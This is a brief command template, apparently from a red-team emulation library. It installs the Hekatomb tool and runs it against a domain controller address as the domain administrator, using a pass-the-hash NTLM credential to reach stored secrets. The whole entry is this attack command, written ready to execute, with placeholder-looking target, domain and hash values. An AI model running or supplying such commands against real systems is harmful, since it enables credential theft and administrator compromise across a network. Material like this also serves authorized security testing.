---
id: 609f0980-5c0d-4cd1-ad26-440989040a81
name: Install Hekatomb and Perform Hashes
type: command
executor: bash
data: 'pip3 install hekatomb

  hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1
  -debug -dnstcp'
output: null
created_at: '2023-04-06T03:56:26.320991+00:00'
updated_at: '2023-04-10T20:37:12.952531+00:00'
---

# Install Hekatomb and Perform Hashes

```bash
pip3 install hekatomb
hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
```


